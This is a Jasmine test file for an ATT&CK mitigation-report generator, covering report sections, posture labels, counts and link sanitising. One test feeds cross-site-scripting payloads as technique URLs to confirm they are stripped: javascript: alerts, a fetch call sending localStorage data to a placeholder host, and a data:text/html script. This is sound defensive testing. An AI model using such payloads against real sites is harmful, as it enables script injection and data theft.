// ATTACK-Navi - Copyright (c) 2026 TeamStarWolf
// https://github.com/TeamStarWolf/ATTACK-Navi - MIT License
import { TestBed } from '@angular/core/testing';
import { HtmlReportService } from './html-report.service';
import { Domain } from '../models/domain';
import { ImplStatus } from './implementation.service';
import { DEFAULT_REPORT_CONFIG, ReportConfig } from './report-config.service';
import { makeSplitDomain } from '../testing/report-split-fixture';
import { PostureStub, makePostureStub, postureStubProvider } from '../testing/posture-stub';
import { ImplementationService } from './implementation.service';
import type { PostureBucket } from '../models/posture/posture.types';

// Minimal Domain stub — buildHtml only touches these fields, and empty
// collections still exercise every ungated section (exec summary, coverage by
// tactic, gaps, best covered). Cast through unknown to satisfy the full type.
function makeDomain(): Domain {
  return {
    name: 'Enterprise ATT&CK',
    attackVersion: '15.1',
    techniques: [],
    mitigations: [],
    tacticColumns: [],
    mitigationsByTechnique: new Map(),
    techniquesByMitigation: new Map(),
    groupsByTechnique: new Map(),
  } as unknown as Domain;
}

describe('HtmlReportService', () => {
  let service: HtmlReportService;
  let lastBlob: Blob | null;
  // The posture rollup and states the report reads (P2-07), over whatever
  // domain the spec loads; a fresh profile until a spec sets buckets.
  let loaded: Domain | null;
  let posture: PostureStub;
  let implementedMitigations: number;

  // Capture the Blob generateAndOpen hands to the browser, without opening a
  // window. Installed once per spec so it is safe to generate multiple reports.
  function installCaptureSpies(): void {
    lastBlob = null;
    spyOn(URL, 'createObjectURL').and.callFake((blob: Blob) => {
      lastBlob = blob;
      return 'blob:stub';
    });
    spyOn(URL, 'revokeObjectURL').and.stub();
    spyOn(window, 'open').and.returnValue(null);
  }

  async function lastHtml(): Promise<string> {
    expect(lastBlob).not.toBeNull();
    return await lastBlob!.text();
  }

  beforeEach(() => {
    localStorage.removeItem('mitre-nav-settings-v1');
    loaded = null;
    implementedMitigations = 0;
    posture = makePostureStub(() => loaded);
    TestBed.configureTestingModule({
      providers: [
        postureStubProvider(posture),
        { provide: ImplementationService, useValue: { summarize: () => ({ implemented: implementedMitigations }) } },
      ],
    });
    service = TestBed.inject(HtmlReportService);
  });

  afterEach(() => {
    localStorage.removeItem('mitre-nav-settings-v1');
  });

  it('is created', () => {
    expect(service).toBeTruthy();
  });

  it('exposes the public generateAndOpen method', () => {
    expect(typeof service.generateAndOpen).toBe('function');
  });

  it('renders every default section when no config is supplied', async () => {
    installCaptureSpies();
    service.generateAndOpen(makeDomain(), new Map());
    const html = await lastHtml();
    expect(html).toContain('Executive Summary');
    expect(html).toContain('Theoretical by Tactic');
    expect(html).toContain('Top 10 Techniques with No Mitigation Mapped');
    expect(html).toContain('Top 10 Techniques by Mitigations Mapped');
  });

  it('produces identical output for an explicit default config', async () => {
    installCaptureSpies();

    service.generateAndOpen(makeDomain(), new Map());
    const withoutConfig = await lastHtml();

    service.generateAndOpen(makeDomain(), new Map(), DEFAULT_REPORT_CONFIG);
    const withDefault = await lastHtml();

    expect(withDefault).toBe(withoutConfig);
  });

  it('omits a section that is hidden in the config', async () => {
    installCaptureSpies();
    const config: ReportConfig = {
      sections: DEFAULT_REPORT_CONFIG.sections.map(s =>
        s.id === 'coverage-by-tactic' ? { ...s, visible: false } : { ...s },
      ),
    };
    service.generateAndOpen(makeDomain(), new Map(), config);
    const html = await lastHtml();
    // The hidden section title is gone...
    expect(html).not.toContain('Theoretical by Tactic');
    // ...while the still-visible sections remain.
    expect(html).toContain('Executive Summary');
    expect(html).toContain('Top 10 Techniques with No Mitigation Mapped');
  });

  describe('technique links', () => {
    // A technique as the report sees it: a parent with zero mitigations lands
    // in the "No Mitigation Mapped" table, one with mitigations in "Mitigations Mapped".
    function makeTechnique(attackId: string, url: string, mitigationCount = 0) {
      return {
        id: `attack-pattern--${attackId}`,
        attackId,
        name: `Technique ${attackId}`,
        url,
        tacticShortnames: ['execution'],
        isSubtechnique: false,
        mitigationCount,
      };
    }

    function makeDomainWith(techniques: ReturnType<typeof makeTechnique>[]): Domain {
      const domain = makeDomain() as unknown as { techniques: unknown[]; mitigationsByTechnique: Map<string, unknown[]> };
      domain.techniques = techniques;
      for (const t of techniques) {
        if (t.mitigationCount > 0) {
          domain.mitigationsByTechnique.set(t.id, [{ mitigation: { id: 'course-of-action--m1' } }]);
        }
      }
      return domain as unknown as Domain;
    }

    it('emits http(s) technique urls as the link href', async () => {
      installCaptureSpies();
      service.generateAndOpen(makeDomainWith([
        makeTechnique('T1059', 'https://attack.mitre.org/techniques/T1059'),
        makeTechnique('T1003', 'http://attack.mitre.org/techniques/T1003', 2),
      ]), new Map());
      const html = await lastHtml();
      expect(html).toContain('href="https://attack.mitre.org/techniques/T1059"');
      expect(html).toContain('href="http://attack.mitre.org/techniques/T1003"');
    });

    it('never emits a javascript: url as a same-origin link', async () => {
      installCaptureSpies();
      service.generateAndOpen(makeDomainWith([
        makeTechnique('T1059', 'javascript:alert(1)'),
        makeTechnique('T1003', 'JavaScript:fetch("https://x/"+localStorage.getItem("s"))', 2),
        makeTechnique('T1021', 'data:text/html,<script>alert(1)</script>', 3),
      ]), new Map());
      const html = await lastHtml();
      expect(html).not.toContain('javascript:');
      expect(html).not.toContain('JavaScript:');
      expect(html).not.toContain('data:text/html');
      expect(html).toContain('href="#" target="_blank" rel="noopener">T1059<');
      expect(html).toContain('href="#" target="_blank" rel="noopener">T1003<');
      expect(html).toContain('href="#" target="_blank" rel="noopener">T1021<');
    });

    it('falls back to an inert anchor for an empty or relative url', async () => {
      installCaptureSpies();
      service.generateAndOpen(makeDomainWith([
        makeTechnique('T1059', ''),
        makeTechnique('T1003', '/techniques/T1003', 1),
      ]), new Map());
      const html = await lastHtml();
      expect(html).toContain('href="#" target="_blank" rel="noopener">T1059<');
      expect(html).toContain('href="#" target="_blank" rel="noopener">T1003<');
    });

    it('still HTML-escapes an accepted url', async () => {
      installCaptureSpies();
      service.generateAndOpen(makeDomainWith([
        makeTechnique('T1059', 'https://attack.mitre.org/techniques/T1059?a=1&b="x"'),
      ]), new Map());
      const html = await lastHtml();
      expect(html).toContain('href="https://attack.mitre.org/techniques/T1059?a=1&amp;b=&quot;x&quot;"');
    });
  });

  it('forbids script execution in the generated document', async () => {
    // The report is a blob: document on the app's origin; even if a hostile
    // href slipped through, script-src 'none' also blocks javascript: URLs.
    installCaptureSpies();
    service.generateAndOpen(makeDomain(), new Map());
    const html = await lastHtml();
    expect(html).toContain(`<meta http-equiv="Content-Security-Policy" content="script-src 'none'; object-src 'none'; base-uri 'none'" />`);
    expect(html).not.toMatch(/<script\b/i);
    expect(html).not.toMatch(/\son[a-z]+=/i);
  });

  describe('Known / posture split (E1.1, P2-07)', () => {
    function splitDomain(): Domain {
      const d = makeSplitDomain() as unknown as Record<string, unknown> & { techniques: Array<Record<string, unknown>> };
      for (const t of d.techniques) t['url'] = `https://attack.mitre.org/techniques/${t['attackId']}`;
      return {
        ...makeDomain(),
        ...d,
        mitigations: ['M1', 'M2', 'M3'].map(m => ({ id: `course-of-action--${m}`, attackId: m, name: `Mitigation ${m}` })),
      } as unknown as Domain;
    }

    /** Generate the report over the split fixture with these posture buckets. */
    async function report(buckets: Record<string, PostureBucket>, implemented = 0): Promise<string> {
      const domain = splitDomain();
      loaded = domain;
      posture.set(buckets);
      implementedMitigations = implemented;
      if (jasmine.isSpy(URL.createObjectURL)) lastBlob = null;
      else installCaptureSpies();
      service.generateAndOpen(domain, new Map());
      return lastHtml();
    }

    const block = (html: string, key: string): string => {
      const start = html.indexOf(`data-split="${key}"`);
      expect(start).withContext(key).toBeGreaterThan(-1);
      return html.slice(start, html.indexOf('</div>\n      </div>', start));
    };
    const card = (html: string, key: string): number => {
      const m = new RegExp(`<div class="stat-number"[^>]*data-posture="${key}">(\\d+)</div>`).exec(html);
      expect(m).withContext(key).not.toBeNull();
      return Number(m![1]);
    };

    it('reports Known: mapped with the Theoretical sub-line, and Covered (self-attested) from the rollup', async () => {
      const html = await report({ T1: 'covered', T2: 'covered' }, 1);
      const known = block(html, 'known');
      expect(known).toContain('60%');
      expect(known).toContain('Known: mapped');
      expect(known).toContain('Theoretical: mitigation mapped: 3 of 5 parent techniques (60%)');
      const covered = block(html, 'covered');
      expect(covered).toContain('40%');
      expect(covered).toContain('Covered (self-attested)');
      expect(covered).toContain('2 of <span data-posture="assessable">5</span> assessable parent techniques');
      expect(card(html, 'covered')).toBe(2);
      expect(html).toContain('ATT&amp;CK Mitigation Report');
    });

    it('R16: the Covered donut, its line and the tactic bars divide by assessable; Known keeps every parent', async () => {
      posture.exclude(['T3']);
      const html = await report({ T1: 'covered', T2: 'covered' }, 1);
      const doc = new DOMParser().parseFromString(html, 'text/html');
      const covered = doc.querySelector('[data-split="covered"]')!;
      // 2 of 4 assessable (T3 excluded), not 2 of 5.
      expect(covered.querySelector('[data-posture="assessable"]')!.textContent).toBe('4');
      expect(covered.querySelector('[data-share-pct]')!.getAttribute('data-share-pct')).toBe('50');
      expect(covered.textContent).toContain('2 of 4 assessable parent techniques');
      expect(html).toContain('conic-gradient(#2563eb 0deg 180deg');
      const known = doc.querySelector('[data-split="known"]')!;
      expect(known.querySelector('[data-posture="known-total"]')!.textContent).toBe('5');
      expect(known.textContent).toContain('60%');
      const exec = doc.querySelector('.tactic-row[data-tactic="execution"]')!;
      expect(exec.querySelector('[data-posture="assessable"]')!.textContent).toBe('2');
      expect(exec.querySelector('[data-share-pct]')!.getAttribute('data-share-pct')).toBe('100');
      expect(exec.textContent).toContain('2/3');
      expect(doc.querySelector('[data-split="note"]')!.textContent).toContain('assessable');
    });

    it('shows Known only on a fresh profile, with no Covered or Proven words', async () => {
      const html = await report({});
      expect(block(html, 'known')).toContain('60%');
      expect(html).not.toContain('data-split="covered"');
      expect(html).not.toContain('data-posture="covered"');
      expect(html).toContain('No data of yours recorded yet');
      const visible = new DOMParser().parseFromString(html, 'text/html').body.textContent ?? '';
      expect(visible).not.toMatch(/\bcovered\b|\bproven\b|\bdefended\b/i);
    });

    it("replaces the 'All mapped mitigations implemented' card with the rollup's partial count", async () => {
      const html = await report({ T1: 'partial', T2: 'partial', T4: 'covered' }, 1);
      expect(html).not.toContain('All mapped mitigations implemented');
      expect(html).toContain('partial, by cause');
      expect(html).toContain('<div class="stat-label" data-partial-cause>partial (broad mitigation, not confirmed per technique): 2</div>');
      expect(html).not.toContain('range telemetry, no alert credited');
      expect(card(html, 'partial')).toBe(posture.rollup().overall.partial);
      expect(card(html, 'partial')).toBe(2);
      expect(card(html, 'covered')).toBe(1);
    });

    // RP-F decision 36 (round 7, letter G): the HTML report stated a breadth cause for
    // telemetry-only range partials.
    it('an HTML report built from telemetry-only range rows names the telemetry cause and counts it', async () => {
      posture.telemetry(['T1', 'T2']);
      const html = await report({ T1: 'partial', T2: 'partial' });
      expect(html).toContain('<div class="stat-label" data-partial-cause>partial (range telemetry, no alert credited): 2</div>');
      expect(html).not.toContain('broad mitigation, not confirmed');
    });

    // RP-F decision 43 (round 8): the Covered card counts each source.
    it('an HTML report names the Covered sources with a count per source; a range-only report never says self-attested on the card', async () => {
      posture.coveredBy({ T1: 'range', T4: 'both' });
      const html = await report({ T1: 'covered', T2: 'covered', T4: 'covered' });
      expect(html).toContain('<div class="stat-label">Covered (self-attested or range), by source</div>');
      expect(html).toContain('<div class="stat-label" data-posture-source>Covered (self-attested: mitigation, control, confirmation or your run): 2</div>');
      expect(html).toContain('<div class="stat-label" data-posture-source>Covered (range: lab-validated detection): 2</div>');
      posture.coveredBy({ T1: 'range' });
      const rangeOnly = await report({ T1: 'covered' });
      expect(rangeOnly).toContain('<div class="stat-label" data-posture-source>Covered (range: lab-validated detection): 1</div>');
      expect(rangeOnly).not.toContain('confirmation or your run):');
    });

    // PR #241 round 1: the range-only walk profile (T1005, T1105, T1059 deployed;
    // T1550.002, T1037.001 detection-authored) read 'Covered (self-attested) 3 of 222',
    // per-tactic bars keyed 'Covered (self-attested)' and a note 'A technique you
    // recorded ... Not validated.' around its range counts.
    it('a range-only HTML report never labels its Covered counts self-attested: heading, note, tactic bars and subtitle', async () => {
      posture.coveredBy({ T1: 'range', T4: 'range' });
      const html = await report({ T1: 'covered', T4: 'covered' });
      expect(html).not.toContain('Covered (self-attested)');
      expect(html).not.toContain('A technique you recorded');
      expect(html).toContain('<div style="font-size:18px;font-weight:700;color:#07101a;margin-bottom:4px">Covered (range)</div>');
      expect(html).toContain('<strong>Covered (range)</strong>: A technique the range reports a deployed or authored detection for: a lab detection row, not a proof. Covered (range) shares divide by assessable parent techniques');
      expect(html).toContain('<span class="bar-key">Covered (range)</span>');
      expect(html).toContain(' Covered (range): A technique the range reports a deployed or authored detection for');
      posture.coveredBy({ T1: 'range', T4: 'self-attested' });
      const mixed = await report({ T1: 'covered', T4: 'covered' });
      // T4's own badge names its own source; the counts' words name both.
      expect(mixed).not.toContain('<span class="bar-key">Covered (self-attested)</span>');
      expect(mixed).not.toContain('<strong>Covered (self-attested)</strong>');
      expect(mixed).toContain('<span class="bar-key">Covered (self-attested or range)</span>');
      expect(mixed).toContain('<div style="font-size:18px;font-weight:700;color:#07101a;margin-bottom:4px">Covered (self-attested or range)</div>');
      posture.coveredBy({});
      const own = await report({ T1: 'covered', T4: 'covered' });
      expect(own).toContain('<span class="bar-key">Covered (self-attested)</span>');
    });

    it('badges each table technique with postureBadge(stateFor(t))', async () => {
      const html = await report({ T1: 'partial', T2: 'proven', T4: 'covered' });
      const domain = loaded!;
      for (const t of domain.techniques.filter(x => !x.isSubtechnique)) {
        expect(service.techniqueBadge(t)).withContext(t.attackId).toContain(`data-bucket="${posture.stateFor(t).bucket}"`);
      }
      expect(service.techniqueBadge(domain.techniques[0])).toContain('Covered (self-attested, partial via M1)');
      expect(html).toContain('<th>Posture</th>');
      expect(html).not.toContain('Impl Status (self-attested)');
      expect(html).not.toMatch(/badge-green">Implemented</);
    });

    it('drops every wording and colour that read reference mapping as implemented or safe', async () => {
      const html = await report({});
      for (const retired of ['Techniques Covered', 'Techniques at Risk', 'Technique Coverage', 'Fully Implemented',
        'Avg Mitigations / Covered Tech', 'ATT&amp;CK Coverage Report', 'Best Covered', 'Coverage Gaps', 'No coverage gaps']) {
        expect(html).withContext(retired).not.toContain(retired);
      }
      // The coverage donut and tactic bars were green/amber/red by percentage.
      expect(html).not.toContain('conic-gradient(#22c55e');
      expect(html).not.toContain('linear-gradient(90deg,#22c55e');
      expect(html).not.toContain('linear-gradient(90deg,#ef4444');
    });

    it('gives each tactic a Theoretical bar and, with owner data, a Covered bar', async () => {
      const html = await report({ T4: 'covered' }, 1);
      expect(html).toContain('Theoretical and Posture by Tactic');
      expect((html.match(/class="bar-fill bar-theoretical" style="width:\d+%"/g) ?? []).length).toBe(2);
      expect(html).toContain('class="bar-fill bar-implemented" style="width:50%"');
      expect(html).toContain('class="bar-fill bar-implemented" style="width:0%"');
      const fresh = await report({});
      expect(fresh).not.toContain('bar-fill bar-implemented');
    });
  });

  it('uses the configured organization name in the header when set', async () => {
    service['settings'].update({ orgName: 'Acme Security Ops' });
    installCaptureSpies();
    service.generateAndOpen(makeDomain(), new Map());
    const html = await lastHtml();
    expect(html).toContain('Acme Security Ops');
    expect(html).not.toContain('<strong>Organization:</strong> Security Team');
  });
});
